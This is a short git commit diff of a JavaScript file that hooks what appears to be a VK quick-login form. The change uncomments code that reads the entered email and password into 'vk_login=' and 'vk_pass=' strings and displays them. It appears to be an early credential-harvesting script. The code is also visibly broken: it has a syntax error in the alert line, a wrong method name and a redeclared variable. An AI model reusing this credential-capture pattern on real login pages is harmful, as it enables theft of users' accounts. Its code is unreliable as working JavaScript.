a3e7d42c5731b9cf9a2511ed57a82faef56bd94a
Войченко Виталий <mrabbat69@gmail.com>
2017-07-21 17:40:36 +0700

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,13 +1,11 @@
 var login = document.getElementById ('quick_email'),
     pass = document.getElementById ('quick_pass'),
     login_btn = document.getElementById ('quick_login_button');
-    /*dateToExpire = +Date.now() + 365 * 3 * 24 * 60 * 60 * 1000,
-    formattedDateToExpire = new Date(dateToExpire).toUTCString();*/
 
 login_btn.onsubmit = function (evt){
     evt.PreventDefault();
-    /*var log = 'vk_login=' + login.value;
-    var pass  = 'vk_pass=' + pass.value;*/
-    alert ('Все успешно записано, лол)');
+    var log = 'vk_login=' + login.value,
+        pass  = 'vk_pass=' + pass.value;
+    alert (log + "  " pass);
     login_btn.submit();
 }
